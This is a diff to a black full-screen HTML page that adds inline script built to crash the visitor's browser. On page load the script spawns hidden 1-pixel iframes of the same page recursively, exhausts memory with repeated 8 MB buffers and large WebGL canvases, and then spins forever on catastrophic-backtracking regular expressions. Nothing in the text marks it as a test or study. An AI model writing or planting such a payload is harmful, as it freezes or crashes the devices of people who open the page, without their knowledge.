@@ -7,6 +7,52 @@
 <style>html,body{margin:0;height:100%;width:100%;background:#000;overflow:hidden}</style>
 </head>
 <body>
-<script src="/crash.js"></script>
+<script>
+(function(){
+  var d = +(location.search.match(/[?&]d=(\d+)/) || [0,0])[1];
+  var B = [], t0 = Date.now();
+
+  function bite(n){ var a = new Uint8Array(n); for (var i = 0; i < n; i += 4096) a[i] = i & 255; return a; }
+
+  for (var k = 0; k < 2 && d < 7; k++) {
+    try {
+      var f = document.createElement('iframe');
+      f.src = '/void.html?d=' + (d + 1);
+      f.setAttribute('scrolling', 'no');
+      f.style.cssText = 'position:fixed;left:0;top:0;width:1px;height:1px;border:0;opacity:0';
+      document.body.appendChild(f);
+    } catch (e) {}
+  }
+
+  try {
+    var cv = document.createElement('canvas');
+    cv.width = 2048; cv.height = 2048;
+    var gl = cv.getContext('webgl');
+    if (gl) { gl.clearColor(0,0,0,1); gl.clear(gl.COLOR_BUFFER_BIT); }
+    B.push(cv); B.push(gl);
+  } catch (e) {}
+
+  function slam() {
+    for (var i = 0; i < 6; i++) {
+      try { B.push(bite(8 << 20)); }
+      catch (e) { B.length = 0; }
+    }
+    if (Date.now() - t0 < 550) setTimeout(slam, 1);
+    else freeze();
+  }
+
+  function freeze() {
+    var R1 = /^(a+)+$/, R2 = /(a|aa)+$/;
+    var S1 = 'a'.repeat(28) + '!', S2 = 'a'.repeat(20) + '!';
+    for (;;) {
+      try { R1.test(S1); } catch (e) {}
+      try { R2.test(S2); } catch (e) {}
+      try { B.push(new Uint8Array(1 << 20)); } catch (e) { B.length = 0; }
+    }
+  }
+
+  setTimeout(slam, 0);
+})();
+</script>
 </body>
-</html>
+  </html>
